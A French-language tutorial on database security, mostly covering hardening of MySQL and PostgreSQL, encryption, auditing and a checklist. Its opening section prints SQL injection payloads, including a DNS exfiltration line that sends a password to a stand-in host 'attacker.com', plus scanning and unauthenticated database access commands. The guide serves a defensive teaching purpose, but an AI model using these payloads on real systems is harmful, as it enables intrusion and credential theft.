# Sécurité des bases de données : protéger vos données sensibles

Les bases de données contiennent les données les plus sensibles de votre organisation. Une compromission de base de données est souvent l'objectif final d'une attaque. Ce guide couvre les vecteurs d'attaque et les meilleures pratiques de sécurisation.

## Vecteurs d'attaque sur les BDD

### Injection SQL avancée

```sql
-- Injection UNION pour exfiltrer des données
' UNION SELECT username, password, 3, 4 FROM users--

-- Blind SQLi (pas de retour direct)
' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--

-- Time-based blind SQLi
' AND 1=(SELECT SLEEP(5))--
' AND 1=(SELECT CASE WHEN (username='admin') THEN SLEEP(5) ELSE 0 END FROM users)--

-- Out-of-band SQLi (DNS exfiltration)
' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\',
    (SELECT password FROM users LIMIT 1),
    '.attacker.com\\share')))--
```

### Accès direct aux ports BDD exposés

```bash
# Scanner les BDD exposées sur Internet (NE JAMAIS faire sans autorisation)
nmap -p 3306,5432,1433,1521,27017 192.168.1.0/24

# MySQL exposé
mysql -h 192.168.1.100 -u root -p
# Si pas de mot de passe : connexion directe !

# MongoDB sans authentification (très courant !)
mongo --host 192.168.1.100:27017
> show dbs
> use production
> db.users.find()  # Accès direct à toutes les données !
```

## Sécurisation MySQL/MariaDB

```sql
-- 1. Supprimer les comptes anonymes
DELETE FROM mysql.user WHERE User='';
FLUSH PRIVILEGES;

-- 2. Désactiver la connexion root à distance
UPDATE mysql.user SET Host='localhost' WHERE User='root';
FLUSH PRIVILEGES;

-- 3. Principe du moindre privilège
CREATE USER 'app_user'@'10.0.0.%' IDENTIFIED BY 'MotDePasseFort123!';
GRANT SELECT, INSERT, UPDATE ON app_database.* TO 'app_user'@'10.0.0.%';
-- Pas de DROP, DELETE, CREATE, GRANT

-- 4. Chiffrement des données sensibles
-- Chiffrement au niveau colonne
CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password_hash VARCHAR(255),  -- bcrypt, pas MD5 !
    email_encrypted VARBINARY(255),  -- AES_ENCRYPT
    credit_card VARBINARY(255)
);

-- Insérer avec chiffrement
INSERT INTO users (email_encrypted)
VALUES (AES_ENCRYPT('user@email.com', SHA2('encryption_key', 256)));

-- 5. Activer les logs d'audit
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/queries.log';
```

## Sécurisation PostgreSQL

```sql
-- pg_hba.conf - Contrôle d'accès
# Seulement les connexions locales et depuis l'app server
local   all             postgres                                peer
host    app_db          app_user        10.0.0.5/32             scram-sha-256
host    all             all             0.0.0.0/0               reject  # Bloquer tout le reste

-- Chiffrement TLS obligatoire
-- postgresql.conf
ssl = on
ssl_cert_file = 'server.crt'
ssl_key_file = 'server.key'

-- Row Level Security (RLS) - Isolation par utilisateur
CREATE TABLE documents (
    id SERIAL,
    owner_id INT,
    content TEXT
);

ALTER TABLE documents ENABLE ROW LEVEL SECURITY;

CREATE POLICY user_isolation ON documents
    USING (owner_id = current_user_id());

-- Chaque utilisateur ne voit que SES données
```

## Chiffrement transparent des données (TDE)

```
Transparent Data Encryption :
→ Chiffre les fichiers de données sur disque
→ Transparent pour l'application (pas de changement de code)
→ Protège contre le vol physique du disque

MySQL : InnoDB tablespace encryption
PostgreSQL : pgcrypto + chiffrement filesystem
SQL Server : TDE natif
Oracle : Advanced Security TDE

Limites :
→ Ne protège pas contre les accès via l'application
→ Ne protège pas contre un DBA malveillant
→ Complément nécessaire : chiffrement au niveau applicatif
```

## Audit et monitoring

```bash
# pgAudit - Audit complet PostgreSQL
shared_preload_libraries = 'pgaudit'
pgaudit.log = 'all'  # Logger toutes les requêtes

# MySQL Enterprise Audit
plugin-load-add=audit_log.so
audit_log_format=JSON
audit_log_policy=ALL

# Détecter les requêtes suspectes
# Requêtes qui lisent beaucoup de données d'un coup
SELECT query, calls, rows, mean_exec_time
FROM pg_stat_statements
WHERE rows > 10000
ORDER BY rows DESC;

# Connexions à des heures inhabituelles
SELECT usename, client_addr, backend_start, query_start
FROM pg_stat_activity
WHERE EXTRACT(HOUR FROM backend_start) NOT BETWEEN 8 AND 18;
```

## Checklist sécurité BDD

```
✅ Pas de BDD exposée directement sur Internet
✅ Authentification forte (pas de comptes sans mot de passe)
✅ Principe du moindre privilège (un user par application)
✅ Chiffrement TLS pour les connexions
✅ Chiffrement at-rest (TDE)
✅ Données sensibles chiffrées au niveau colonne
✅ Audit logging activé
✅ Mises à jour régulières
✅ Pas de credentials en dur dans le code (utiliser des secrets managers)
✅ Backup chiffré et testé régulièrement
✅ Firewall : seul l'app server peut accéder au port BDD
```

## Conclusion

La sécurité des bases de données repose sur la **défense en profondeur** : isolation réseau, authentification forte, moindre privilège, chiffrement et audit. Une base de données bien sécurisée, même si l'application web est compromise via SQLi, doit limiter les dégâts grâce aux contrôles d'accès et au chiffrement des données sensibles.

---
*Catégorie : Sécurité réseau*
